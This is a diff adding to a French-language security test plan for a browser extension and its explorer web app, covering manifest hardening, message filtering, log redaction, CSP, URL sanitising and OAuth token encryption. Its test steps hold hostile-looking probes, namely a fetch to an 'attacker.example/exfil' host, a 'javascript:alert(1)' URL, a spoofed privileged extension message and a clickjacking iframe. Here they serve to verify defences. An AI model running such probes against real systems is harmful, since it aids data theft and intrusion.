@@ -358,6 +358,217 @@ Rejected WALLET_CONNECTED: invalid SIWE proof
 
 ---
 
-## Phase 3 — Manifest & permissions
+## Phase 3 — Manifest, dispatcher, logs
 
-(à compléter après les commits)
+### Commit 8 — `chore(manifest): strip localhost from prod externally_connectable`
+
+**Bug** : `http://localhost:3000/*` shippait dans le manifest prod. Tout serveur
+local sur :3000 (npm dev hostile, webhook attaquant) pouvait envoyer
+`WALLET_CONNECTED`/`OAUTH_TOKEN_SUCCESS` à l'extension publiée.
+
+🧪 **Test 8.1 — `bun run build` strip ok**
+1. `bun run build` (manuel).
+2. ✅ Console : `[post-build] Stripped 1 localhost origin(s) from prod externally_connectable`
+3. Inspecter `build/chrome-mv3-prod/manifest.json` :
+   - `externally_connectable.matches` ne contient PAS `http://localhost:3000/*`
+   - Contient `https://doc.sofia.intuition.box/*`
+
+🧪 **Test 8.2 — Dev (testnet) garde localhost**
+1. `bun run dev`.
+2. Inspecter `build/chrome-mv3-dev/manifest.json` : localhost présent.
+3. ✅ La landing locale (`localhost:3000`) peut se connecter à l'extension dev.
+
+🧪 **Test 8.3 — Defense-in-depth runtime**
+Avec build prod chargée :
+- DevTools console SW : envoyer un faux `WALLET_CONNECTED` depuis un onglet
+  `http://localhost:3000` (s'il existait) → message rejeté.
+- Si Chrome bypass le manifest filter (ne devrait jamais arriver), le runtime
+  filter dans `messageHandlers.ts` rejette aussi (`PLASMO_PUBLIC_NETWORK === 'mainnet'`).
+
+### Commit 9 — Manifest cleanup
+
+🧪 **Test 9 — Permissions cohérentes après build**
+Inspecter `build/chrome-mv3-prod/manifest.json` :
+- `permissions` contient explicitement `"scripting"`
+- `host_permissions` ne contient pas `https://auth.privy.io/*`
+- Le wallet bridge marche toujours (test signing existant).
+
+### Commit 10 — `fix(messages): reject privileged messages from content scripts`
+
+**Bug** : un content script (= script injecté sur une page web visitée) pouvait
+envoyer des messages privilégiés (`LEVEL_UP_GROUP`, `CERTIFY_URL`, etc.) au SW
+comme s'il venait du sidepanel.
+
+🧪 **Test 10.1 — Repro depuis devtools content**
+Sur n'importe quelle page web (HTTPS), DevTools console :
+```js
+chrome.runtime.sendMessage("<extension-id>", {
+  type: "LEVEL_UP_GROUP",
+  data: { groupId: "fake", targetLevel: 99 }
+}, console.log)
+```
+- ✅ Réponse : `{ success: false, error: "Message not allowed from content script" }`
+- ✅ Console SW : `Rejected privileged message from content script` avec l'URL
+   du tab.
+- ✅ Aucun side effect sur le service `levelUpService`.
+
+🧪 **Test 10.2 — Le sidepanel marche toujours**
+Test classique : open sidepanel → click "Level up" sur un group → confirm.
+- ✅ Level-up s'exécute (sidepanel n'a pas `sender.tab`, pas filtré).
+
+🧪 **Test 10.3 — Tracking telemetry passe encore**
+Ouvre un site quelconque, navigue. Console SW :
+- ✅ Logs `PAGE_DATA`, `URL_CHANGED`, `TRACK_URL` reçus normalement (ces messages
+  sont content-script-only par design, pas dans `SIDEPANEL_ONLY_MESSAGES`).
+
+### Commit 11 — Logs redaction
+
+🧪 **Test 11 — Aucune leak de tokens / IPFS / calldata**
+1. Connecter un compte OAuth (ex. Twitter via la landing).
+2. Faire une certification d'URL (qui crée un atom IPFS).
+3. Inspecter le SW console + DevTools network :
+   - ✅ Pas de `console.log` brut avec emoji 📍📦✅
+   - ✅ Pas de log contenant `accessToken.substring(0, 20)`
+   - ✅ Pas de log contenant `responseUrl` brut (avec query/fragment)
+   - ✅ `logger.debug` redacted : `{ platform, present: true }` au lieu du token
+
+---
+
+## Phase 4 — Explorer
+
+### Commit 12 — On-chain triple verification
+
+🧪 **Test 12.1 — Golden path**
+1. Sur l'explorer, ajouter un cert au cart, ouvrir WeightModal.
+2. ✅ Bouton submit affiche "Verifying on-chain..." brièvement (< 200ms).
+3. ✅ Submit s'active une fois le multicall terminé.
+4. ✅ Network tab : un seul `eth_call` au contrat Multicall3.
+
+🧪 **Test 12.2 — Triple inexistant (simulation)**
+DevTools console explorer :
+```js
+// Forcer un termId invalide via le store du cart (selon l'implémentation)
+// Ou modifier le fetch indexer mock
+```
+Plus simplement : si l'indexer renvoie un termId qui n'existe pas on-chain
+(possible en testnet), le warning rouge "Triple verification failed" doit
+s'afficher et le submit doit être désactivé.
+
+### Commit 13 — Display target contract
+
+🧪 **Test 13** : ouvrir WeightModal → cost summary doit afficher
+"Signing against 0x26F8…12c6c ↗" cliquable, lien vers explorer.
+
+### Commit 14 — chain explicit
+
+🧪 **Test 14** : faire un deposit → ✅ TX réussit, viem ne warn plus sur la
+chain. Inspecter le payload signé : `chainId === 1155`.
+
+### Commit 15 — safeHref + referrerPolicy
+
+🧪 **Test 15.1 — Bon URL HTTPS**
+- CircleCard avec `item.url = "https://example.com"` → bouton ExternalLink
+  cliquable, ouvre l'URL dans nouvel onglet.
+
+🧪 **Test 15.2 — URL malicieux**
+DevTools console :
+```js
+// Inspecter un atom dont l'URL est "javascript:alert(1)"
+// (impossible à reproduire facilement sans atom poisoning)
+```
+Vérification statique : `safeHref("javascript:alert(1)")` retourne `undefined`,
+donc le bouton ExternalLink est masqué (`{safeHref(item.url) && (...)}`).
+
+🧪 **Test 15.3 — Referrer policy**
+Network tab → click sur une trending page → la requête favicon n'envoie pas
+de header `Referer`.
+
+### Commit 16 — CSP
+
+🧪 **Test 16.1 — App marche en prod**
+1. `bun run build` côté explorer.
+2. Servir avec nginx.
+3. ✅ App charge sans erreur CSP dans la console.
+4. Login Privy → wallet popup → marche (frame-src whitelist Privy).
+5. GraphQL queries → marchent (connect-src whitelist).
+
+🧪 **Test 16.2 — CSP bloque l'inattendu**
+DevTools console :
+```js
+fetch("https://attacker.example/exfil")
+```
+- ✅ Console : `Refused to connect to ... because it violates CSP directive`.
+
+🧪 **Test 16.3 — Clickjacking**
+Tentative d'iframe l'explorer depuis un autre domaine :
+```html
+<iframe src="https://explorer.intuition.box"></iframe>
+```
+- ✅ L'iframe reste blanc, console : `Refused to display in a frame because
+  an ancestor violates the Content Security Policy directive 'frame-ancestors 'self''`.
+
+### Commit 17 — Pinata cleanup
+
+⚠️ **Action manuelle hors commit** :
+1. Révoquer le scoped key Pinata (admin Pinata) — le JWT actuel devient mort.
+2. Supprimer la ligne `PINATA_JWT="..."` de `apps/explorer/.env` et
+   `sofia-explorer/.env`.
+3. ✅ Vérifier qu'aucun script restant ne casse :
+   `ls apps/explorer/scripts/*.mjs` — `create-platform-atoms.mjs` doit être
+   absent. Les autres scripts ne dépendent plus du JWT.
+
+### Commit 18 — OAuth encryption
+
+🧪 **Test 18.1 — Round-trip**
+1. Connecter Spotify (ou autre OAuth) via la landing.
+2. DevTools console SW : `chrome.storage.local.get(null, console.log)`
+3. ✅ La valeur de `oauth_token_spotify_<wallet>` est de la forme
+   `{ __enc: 1, ct: "...", iv: "..." }` — pas de plaintext.
+4. ✅ La session de Spotify marche (Sofia peut fetch user data → token decrypted).
+
+🧪 **Test 18.2 — Restart browser**
+1. Fermer Chrome complètement.
+2. Rouvrir → la `chrome.storage.session.oauth_encryption_key` est régénérée.
+3. Ouvrir Sofia → tenter une action OAuth-dépendante.
+4. ✅ Console : `Token decrypt failed, removing stale ciphertext` →
+   l'utilisateur doit re-OAuth (acceptable, par design).
+
+🧪 **Test 18.3 — Migration legacy**
+Si `chrome.storage.local` contient un token plaintext d'une version
+antérieure :
+1. ✅ Premier `getToken` log : `Migrating plaintext token to encrypted form`.
+2. ✅ Le token est ré-écrit comme blob chiffré.
+3. ✅ L'API caller (PlatformDataFetcher) reçoit le token en clair, pas de
+   régression fonctionnelle.
+
+---
+
+## Phase 5 — Final rebuild & ship
+
+⚠️ **Action manuelle obligatoire avant publication CWS** :
+
+1. **Clean slate** :
+   ```bash
+   cd apps/extension
+   rm -rf build/ .plasmo/
+   ```
+2. **Rebuild propre** :
+   ```bash
+   bun run build
+   ```
+3. **Vérifications** sur `build/chrome-mv3-prod/` :
+   - `manifest.json` :
+     - `externally_connectable.matches` n'a PAS `localhost`
+     - `permissions` contient `"scripting"`
+     - `host_permissions` ne contient PAS `auth.privy.io/*`
+   - Aucun fichier `walletBridge.*.js` ou `walletRelay.*.js` (audit finding #1
+     déjà résolu : ces sources sont supprimées et `.plasmo/static/` régénéré)
+   - `content_scripts` ne référence PAS un walletBridge legacy
+4. **Package** : `bun run package` → `.zip` pour Chrome Web Store.
+5. **Smoke test final** sur le `.zip` :
+   - Charger `Load unpacked` depuis le zip extrait
+   - Connecter wallet via la landing → SIWE popup → signer → connexion OK
+   - Faire une certification → submit cart → TX OK
+   - Voter → TX OK
+   - Redeem une position → TX OK avec `minAssets > 0` dans le calldata
+
